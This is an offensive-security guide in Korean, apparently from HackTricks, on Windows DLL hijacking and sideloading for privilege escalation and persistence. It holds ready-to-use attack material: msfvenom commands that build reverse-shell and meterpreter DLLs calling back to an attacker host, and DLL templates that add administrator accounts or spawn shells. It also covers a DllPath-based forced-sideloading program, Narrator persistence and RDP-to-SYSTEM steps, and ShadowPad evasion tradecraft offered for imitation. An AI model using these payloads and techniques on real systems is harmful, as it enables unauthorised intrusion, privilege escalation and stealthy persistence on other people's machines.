# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 기본 정보

DLL Hijacking은 신뢰된 애플리케이션이 악성 DLL을 로드하도록 조작하는 것을 말합니다. 이 용어는 **DLL Spoofing, Injection, and Side-Loading** 같은 여러 전술을 포괄합니다. 주로 코드 실행, 지속성 확보, 그리고 드물게 권한 상승에 사용됩니다. 여기서는 권한 상승에 초점을 맞추지만, 하이재킹 방법 자체는 목적에 관계없이 동일합니다.

### 일반적인 기법

DLL hijacking에는 애플리케이션의 DLL 로드 전략에 따라 다양한 방법이 사용됩니다:

1. **DLL Replacement**: 정식 DLL을 악성 DLL로 교체하며, 원래 DLL의 기능을 유지하기 위해 DLL Proxying을 선택적으로 사용할 수 있습니다.
2. **DLL Search Order Hijacking**: 악성 DLL을 합법 DLL보다 먼저 검색되는 경로에 배치하여 애플리케이션의 검색 패턴을 악용합니다.
3. **Phantom DLL Hijacking**: 애플리케이션이 없다고 생각하는 필수 DLL을 로드하도록 악성 DLL을 생성합니다.
4. **DLL Redirection**: `%PATH%` 또는 `.exe.manifest` / `.exe.local` 같은 검색 매개변수를 수정하여 애플리케이션이 악성 DLL을 가리키도록 만듭니다.
5. **WinSxS DLL Replacement**: WinSxS 디렉터리 내에서 정식 DLL을 악성 DLL로 대체하는 방법으로, 종종 DLL side-loading과 관련됩니다.
6. **Relative Path DLL Hijacking**: 복사된 애플리케이션과 함께 사용자가 제어하는 디렉터리에 악성 DLL을 배치하는 방식으로, Binary Proxy Execution 기법과 유사합니다.

> [!TIP]
> HTML staging, AES-CTR configs, 그리고 .NET implants를 DLL sideloading 위에 계층화하는 단계별 체인을 보려면 아래 워크플로를 검토하세요.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## 누락된 DLL 찾기

시스템 내부의 누락된 DLL을 찾는 가장 일반적인 방법은 sysinternals의 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)을 실행한 다음, **다음 2개의 필터**를 설정하는 것입니다:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

그리고 **파일 시스템 활동(File System Activity)**만 표시하세요:

![](<../../../images/image (153).png>)

일반적으로 **누락된 DLL을 전반적으로 찾고 있다면** 이 상태로 몇 **초 동안** 실행해 둡니다.\
특정 실행 파일 안의 **누락된 DLL을 찾고 있다면**, **"Process Name" "contains" `<exec name>`** 같은 추가 필터를 설정하고 실행한 뒤 이벤트 캡처를 중지해야 합니다.

## 누락된 DLL 악용

권한을 상승시키려면, 가장 좋은 기회는 권한이 높은 프로세스가 로드하려고 시도할 DLL을 우리가 쓸 수 있는 위치에 쓸 수 있는 경우입니다. 따라서 DLL이 원본 DLL이 있는 폴더보다 먼저 검색되는 폴더에 악성 DLL을 **쓰기**할 수 있거나(특이한 경우), DLL이 검색될 폴더에 쓸 수 있고 원본 **DLL이 어떤 폴더에도 존재하지 않는** 경우가 될 수 있습니다.

### DLL 검색 순서

**Microsoft documentation**(https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching)에서 DLL이 어떻게 로드되는지 구체적으로 확인할 수 있습니다.

**Windows applications**는 미리 정의된 검색 경로 집합을 따라 특정 순서로 DLL을 찾습니다. 악성 DLL을 이런 디렉터리 중 하나에 전략적으로 배치하면 정식 DLL보다 먼저 로드되어 DLL hijacking 문제가 발생합니다. 이를 방지하는 한 가지 방법은 애플리케이션이 필요한 DLL을 참조할 때 절대 경로를 사용하도록 하는 것입니다.

다음은 32-bit 시스템에서의 **DLL 검색 순서**입니다:

1. 애플리케이션이 로드된 디렉터리.
2. 시스템 디렉터리. 이 디렉터리 경로를 얻으려면 [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 함수를 사용하세요. (_C:\Windows\System32_)
3. 16-bit 시스템 디렉터리. 이 디렉터리의 경로를 얻는 함수는 없지만 검색됩니다. (_C:\Windows\System_)
4. Windows 디렉터리. 이 디렉터리 경로를 얻으려면 [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 함수를 사용하세요.
1. (_C:\Windows_)
5. 현재 디렉터리.
6. PATH 환경 변수에 나열된 디렉터리들. 이때 **App Paths** 레지스트리 키로 지정된 애플리케이션별 경로는 포함되지 않는다는 점에 유의하세요. **App Paths** 키는 DLL 검색 경로를 계산할 때 사용되지 않습니다.

이는 **SafeDllSearchMode**가 활성화된 기본 검색 순서입니다. 이 기능이 비활성화되면 현재 디렉터리가 두 번째로 올라갑니다. 이 기능을 비활성화하려면 **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** 레지스트리 값을 만들고 0으로 설정하세요(기본값은 활성화됨).

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 함수가 **LOAD_WITH_ALTERED_SEARCH_PATH** 플래그로 호출되면 검색은 LoadLibraryEx가 로드하는 실행 모듈의 디렉터리에서 시작됩니다.

마지막으로, DLL이 이름 대신 절대 경로로 지정되어 로드될 수 있다는 점에 유의하세요. 그 경우 해당 DLL은 그 경로에서만 검색됩니다(해당 DLL이 다른 종속성을 가지는 경우, 그 종속성들은 이름으로 로드된 것처럼 검색됩니다).

검색 순서를 변경하는 다른 방법들도 있지만 여기서는 설명하지 않겠습니다.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

새로 생성된 프로세스의 DLL 검색 경로에 결정론적으로 영향을 주는 고급 방법은 ntdll의 네이티브 API로 프로세스를 생성할 때 RTL_USER_PROCESS_PARAMETERS의 DllPath 필드를 설정하는 것입니다. 여기에 공격자가 제어하는 디렉터리를 제공하면, 대상 프로세스가 DLL을 이름으로 해결할 때(절대 경로가 아니고 안전 로드 플래그를 사용하지 않는 경우) 해당 디렉터리에서 악성 DLL을 로드하도록 강제할 수 있습니다.

핵심 아이디어
- RtlCreateProcessParametersEx로 프로세스 파라미터를 구성하고, 제어 가능한 폴더(예: dropper/unpacker가 위치한 디렉터리)를 가리키는 사용자 지정 DllPath를 제공합니다.
- RtlCreateUserProcess로 프로세스를 생성합니다. 대상 바이너리가 이름으로 DLL을 해결할 때 로더는 이 제공된 DllPath를 참조하여, 악성 DLL이 대상 EXE와 같은 위치에 있지 않더라도 신뢰할 수 있는 sideloading을 가능하게 합니다.

주의/제한사항
- 이는 생성되는 자식 프로세스에 영향을 미치며, 현재 프로세스에만 영향을 미치는 SetDllDirectory와는 다릅니다.
- 대상은 DLL을 이름으로 import하거나 LoadLibrary해야 합니다(절대 경로가 아니며 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories를 사용하지 않는 경우).
- KnownDLLs 및 하드코딩된 절대 경로는 하이재킹할 수 없습니다. Forwarded exports와 SxS는 우선순위를 변경할 수 있습니다.

간단한 C 예제 (ntdll, wide strings, 간소화된 오류 처리):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

운영 사용 예
- 악성 xmllite.dll (필요한 함수를 export 하거나 실제 DLL을 프록시하는)을 DllPath 디렉토리에 배치합니다.
- 위 기법을 사용하여 이름으로 xmllite.dll을 조회하는 것으로 알려진 서명된 바이너리를 실행합니다. 로더는 제공된 DllPath를 통해 import 를 해결하고 귀하의 DLL을 sideload 합니다.

이 기법은 실전에서 multi-stage sideloading chains를 구동하는 것으로 관찰되었습니다: 초기 launcher가 helper DLL을 드롭하고, 그 DLL이 커스텀 DllPath를 가진 Microsoft-signed 하며 hijackable한 바이너리를 spawn 하여 스테이징 디렉토리에서 공격자의 DLL을 강제로 로드하게 합니다.


#### Windows 문서에서의 DLL 검색 순서 예외사항

Windows 문서에서는 표준 DLL 검색 순서에 대한 몇 가지 예외를 언급하고 있습니다:

- **이미 메모리에 로드된 것과 이름이 같은 DLL**이 발견되는 경우, 시스템은 일반적인 검색을 우회합니다. 대신 리디렉션과 매니페스트를 확인한 후 기본적으로 이미 메모리에 있는 DLL을 사용합니다. **이 시나리오에서는 시스템이 DLL을 검색하지 않습니다.**
- 해당 DLL이 현재 Windows 버전에서 **known DLL**로 인식되는 경우, 시스템은 해당 known DLL의 버전과 그에 의존하는 DLL들을 사용하며 **검색 과정을 생략**합니다. 레지스트리 키 **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** 에 이러한 known DLL 목록이 저장되어 있습니다.
- **DLL에 의존성이 있는 경우**, 이러한 의존 DLL들에 대한 검색은 초기 DLL이 전체 경로로 식별되었는지 여부와 관계없이 마치 이들이 **모듈 이름(module names)** 으로만 지정된 것처럼 수행됩니다.

### 권한 상승

**요구사항**:

- 서로 다른 권한으로 동작하거나 동작할 예정인 프로세스( horizontal or lateral movement ) 중에서, **DLL이 없는** 프로세스를 식별합니다.
- **DLL이 검색될** 모든 **디렉터리**에 대해 **쓰기 권한(write access)**이 있는지 확인합니다. 이 위치는 실행 파일의 디렉터리이거나 시스템 경로 내의 디렉터리일 수 있습니다.

네, 요구조건을 찾는 것은 복잡합니다. 기본적으로 권한이 있는 실행 파일이 DLL이 없는 경우를 찾는 것은 이상하고, 시스템 경로 폴더에 쓰기 권한을 갖는 것은 더 이상합니다(기본적으로 불가능합니다). 하지만 잘못 구성된 환경에서는 가능할 수 있습니다.\
운이 좋게 요구사항을 충족하는 경우, [UACME](https://github.com/hfiref0x/UACME) 프로젝트를 확인해 보세요. 이 프로젝트의 **main goal of the project is bypass UAC** 이지만, 해당 Windows 버전에 맞는 Dll hijaking의 **PoC**를 찾을 수 있을 것이며(아마도 쓰기 권한이 있는 폴더의 경로만 변경하면 될 것입니다) 활용할 수 있습니다.

참고로 다음과 같이 **폴더에서 권한을 확인**할 수 있습니다:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
그리고 **PATH 내의 모든 폴더 권한을 확인하세요**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
다음 명령으로 실행 파일의 imports와 dll의 exports를 확인할 수도 있습니다:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)는 system PATH 내의 어떤 폴더에 쓰기 권한이 있는지 확인합니다.\
다른 흥미로운 자동화 도구로 이 취약점을 찾아내는 데 유용한 **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ 및 _Write-HijackDll._이 있습니다.

### Example

만약 exploitable scenario를 발견했다면, 이를 성공적으로 악용하기 위해 가장 중요한 것 중 하나는 실행 파일이 해당 dll에서 가져올 모든 함수를 적어도 내보내는 dll을 만드는 것입니다. 어쨌든, Dll Hijacking은 [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) 또는 [ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)으로 권한을 상승시키는 데 유용합니다. 이 실행을 위한 dll hijacking 연구 내부에서 **how to create a valid dll**의 예는 다음에서 찾을 수 있습니다: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows).\
또한, **next sectio**n에는 **templates**로 유용하거나 **dll with non required functions exported**를 생성하는 데 도움이 될 수 있는 몇 가지 **basic dll codes**가 있습니다.

## **Creating and compiling Dlls**

### **Dll Proxifying**

기본적으로 **Dll proxy**는 로드될 때 **로드될 때 악성 코드를 실행**할 수 있는 Dll이지만, 모든 호출을 실제 라이브러리로 전달함으로써 **기대대로** **노출**하고 **동작**할 수 있는 Dll입니다.

With the tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) or [**Spartacus**](https://github.com/Accenture/Spartacus) you can actually **실행 파일을 지정하고 라이브러리를 선택**하여 proxify하려는 대상의 proxified dll을 생성하거나, **Dll을 지정**하고 proxified dll을 생성할 수 있습니다.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**meterpreter (x86) 얻기:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**사용자 생성 (x86 — x64 버전은 확인되지 않음):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 자신만의

컴파일하는 Dll은 victim process에 의해 로드될 여러 함수를 반드시 **export several functions** 해야 합니다. 이러한 함수들이 존재하지 않으면 **binary won't be able to load** them, 그리고 **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL 예제 (사용자 생성 포함)</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>스레드 진입점이 있는 대체 C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## 사례 연구: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe는 시작 시 예측 가능하고 언어별인 localization DLL을 계속 탐색(probe)하며, 해당 DLL은 hijacked되어 arbitrary code execution 및 persistence를 초래할 수 있습니다.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC 무음
- 단순한 hijack은 UI에서 음성 재생/강조를 발생시킵니다. 조용히 유지하려면, attach 시 Narrator의 스레드를 열거하고 메인 스레드를 열기(`OpenThread(THREAD_SUSPEND_RESUME)`)한 뒤 `SuspendThread`로 일시중단하고, 자신만의 스레드에서 계속 진행하세요. 전체 코드는 PoC를 참조하세요.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 위 설정으로 Narrator를 시작하면 심어진 DLL이 로드됩니다. 보안 데스크톱(로그온 화면)에서 CTRL+WIN+ENTER를 눌러 Narrator를 시작하세요.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- 호스트에 RDP로 접속한 뒤, 로그온 화면에서 CTRL+WIN+ENTER를 눌러 Narrator를 실행하세요; 보안 데스크톱에서 당신의 DLL이 SYSTEM으로 실행됩니다.
- RDP 세션이 종료되면 실행도 중단됩니다 — 빠르게 inject/migrate 하세요.

Bring Your Own Accessibility (BYOA)
- 내장 Accessibility Tool (AT) 레지스트리 항목(예: CursorIndicator)을 복제하고, 임의의 바이너리/DLL을 가리키도록 편집한 후 가져오고 `configuration`을 해당 AT 이름으로 설정할 수 있습니다. 이렇게 하면 Accessibility 프레임워크 하에서 임의 실행을 프록시할 수 있습니다.

Notes
- Writing under `%windir%\System32` and changing HKLM values requires admin rights.
- 모든 페이로드 로직은 `DLL_PROCESS_ATTACH`에 들어갈 수 있으며, export는 필요하지 않습니다.

## 사례 연구: CVE-2025-1729 - TPQMAssistant.exe를 이용한 권한 상승

이 사례는 Lenovo의 TrackPoint Quick Menu (`TPQMAssistant.exe`)에서 **Phantom DLL Hijacking**을 보여주며, **CVE-2025-1729**로 추적됩니다.

### 취약점 세부사항

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit 구현

공격자는 동일한 디렉터리에 악성 `hostfxr.dll` 스텁을 배치하여, 누락된 DLL을 악용해 사용자 컨텍스트에서 코드 실행을 달성할 수 있습니다:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### 공격 흐름

1. 표준 사용자로서 `hostfxr.dll`을 `C:\ProgramData\Lenovo\TPQM\Assistant\`에 배치한다.
2. 현재 사용자 컨텍스트에서 예약된 작업이 오전 9:30에 실행될 때까지 기다린다.
3. 작업이 실행될 때 관리자가 로그인되어 있으면 악성 DLL이 관리자의 세션에서 medium integrity로 실행된다.
4. 표준 UAC bypass 기법을 연계하여 medium integrity에서 SYSTEM 권한으로 상승시킨다.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

위협 행위자는 신뢰된 서명된 프로세스 하에서 페이로드를 실행하기 위해 MSI-based droppers와 DLL side-loading을 자주 결합한다.

Chain overview
- 사용자가 MSI를 다운로드한다. GUI 설치 중에 CustomAction이 조용히 실행되어(예: LaunchApplication 또는 VBScript 액션) 임베디드 리소스에서 다음 단계를 재구성한다.
- dropper가 합법적으로 서명된 EXE와 악성 DLL을 동일한 디렉터리에 쓴다(예: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- 서명된 EXE가 시작되면 Windows DLL search order가 먼저 작업 디렉터리에서 wsc.dll을 로드하여 서명된 부모 프로세스 하에서 공격자 코드를 실행한다(ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction 테이블:
- 실행 파일이나 VBScript를 실행하는 항목을 찾는다. 예시 의심 패턴: 백그라운드에서 임베디드 파일을 실행하는 LaunchApplication.
- Orca (Microsoft Orca.exe)에서 CustomAction, InstallExecuteSequence 및 Binary 테이블을 검사한다.
- MSI CAB 안의 임베디드/분할 페이로드:
- 관리자 추출: msiexec /a package.msi /qb TARGETDIR=C:\out
- 또는 lessmsi 사용: lessmsi x package.msi C:\out
- VBScript CustomAction에 의해 연결되고 복호화되는 여러 작은 조각들을 찾는다. 일반적인 흐름:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
실전 sideloading with wsc_proxy.exe
- 다음 두 파일을 같은 폴더에 넣으세요:
- wsc_proxy.exe: 정상적으로 서명된 호스트 (Avast). 프로세스는 해당 디렉터리에서 이름으로 wsc.dll을 로드하려고 시도합니다.
- wsc.dll: 공격자 DLL. 특정 exports가 필요하지 않다면 DllMain으로 충분합니다; 그렇지 않으면 proxy DLL을 만들고 필요한 exports를 정품 라이브러리로 포워딩하면서 DllMain에서 페이로드를 실행하세요.
- 최소한의 DLL 페이로드를 빌드하세요:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Export 요구사항이 있을 경우, 프록시 프레임워크(예: DLLirant/Spartacus)를 사용해 페이로드도 실행하는 포워딩 DLL을 생성하세요.

- 이 기법은 호스트 바이너리에 의한 DLL 이름 해석에 의존합니다. 호스트가 절대 경로를 사용하거나 안전 로딩 플래그(예: LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories)를 사용하면 hijack이 실패할 수 있습니다.
- KnownDLLs, SxS, and forwarded exports는 우선순위에 영향을 미치므로 호스트 바이너리와 export 집합을 선택할 때 반드시 고려해야 합니다.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point는 Ink Dragon이 핵심 페이로드를 디스크에 암호화 상태로 유지하면서 정식 소프트웨어에 섞어 배포하기 위해 **three-file triad**를 어떻게 사용하는지 설명했습니다:

1. **Signed host EXE** – AMD, Realtek, NVIDIA 같은 벤더(예: `vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`)의 바이너리가 악용됩니다. 공격자는 실행파일 이름을 Windows 바이너리처럼 보이게 바꾸기도 합니다(예: `conhost.exe`)—하지만 Authenticode 서명은 그대로 유효합니다.
2. **Malicious loader DLL** – EXE 옆에 예측 가능한 이름으로 드롭됩니다(예: `vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). 이 DLL은 보통 ScatterBrain 프레임워크로 난독화된 MFC 바이너리이며, 암호화된 블랍을 찾아 복호화하고 ShadowPad를 reflectively map하는 역할만 수행합니다.
3. **Encrypted payload blob** – 종종 동일 디렉터리에 `<name>.tmp`로 저장됩니다. 로더가 복호화된 페이로드를 메모리 맵한 후 TMP 파일을 삭제해 포렌식 흔적을 제거합니다.

Tradecraft notes:

* 서명된 EXE의 이름을 바꾸되 PE 헤더의 `OriginalFileName`은 유지하면, 벤더 서명을 유지하면서 Windows 바이너리처럼 가장할 수 있습니다. Ink Dragon이 실제로는 AMD/NVIDIA 유틸리티인 `conhost.exe`처럼 보이는 바이너리를 드롭한 습관을 모방하세요.
* 실행파일이 신뢰된 상태로 남아 있기 때문에, 대부분의 allowlisting 제어는 악성 DLL이 단지 그 옆에 존재하기만 하면 충분합니다. 로더 DLL 커스터마이징에 집중하세요; 서명된 부모(EXE)는 보통 그대로 실행할 수 있습니다.
* ShadowPad의 decryptor는 TMP 블랍이 로더 옆에 위치하고 쓰기 가능한 상태이길 기대하며, 매핑 후 파일을 0으로 덮어써 삭제합니다. 페이로드가 로드될 때까지 디렉터리를 쓰기 가능 상태로 유지하세요; 메모리에 적재된 이후에는 TMP 파일을 OPSEC을 위해 안전하게 삭제할 수 있습니다.

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)


{{#include ../../../banners/hacktricks-training.md}}
